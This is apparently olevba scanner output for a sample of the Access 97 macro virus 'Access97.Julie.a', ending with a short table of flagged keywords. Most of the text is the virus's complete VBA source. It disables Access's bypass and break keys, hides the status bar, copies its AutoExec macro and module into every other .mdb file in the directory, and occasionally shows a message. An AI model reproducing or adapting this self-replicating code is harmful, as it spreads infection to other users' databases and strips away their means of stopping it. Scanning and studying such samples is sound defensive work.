olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Source-1c939f4eaa023a33732f2167f6a3abcf7b25fda9
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSOffice.Source-1c939f4eaa023a33732f2167f6a3abcf7b25fda9 
in file: Virus.MSOffice.Source-1c939f4eaa023a33732f2167f6a3abcf7b25fda9 - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Compare Database
Option Explicit
Dim Julie As String
Function  Julie()
On Error Resume Next
'Access97.Julie.a
'by -KD- / [Metaphase VX Team] & [NoMercyVirusTeam]
CurrentDb.Properties("AllowBypassKey") = False
CurrentDb.Properties("AllowSpecialKeys") = False
CurrentDb.Properties("AllowBreakIntoCode") = False
Application.DisplayStatusBar = False
Julie = Dir("*.mdb", vbNormal)
Do While Julie <> ""
If CurDir & "\" & Julie <> CurrentDb.Name Then
DoCmd.TransferDatabase acExport, "Microsoft Access", Julie, acMacro, "AutoExec", "AutoExec"
DoCmd.TransferDatabase acExport, "Microsoft Access", Julie, acModule, "Julie", "Julie"
End If
On Error GoTo Exit_Payload
If Day(Now()) = Int(Rnd() * 28) + 1 Then
MsgBox "Access97.Julie.a", "Someday We Will All Have Perfect Wings"
End If
Exit_Payload:
Julie = Dir()
Loop
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

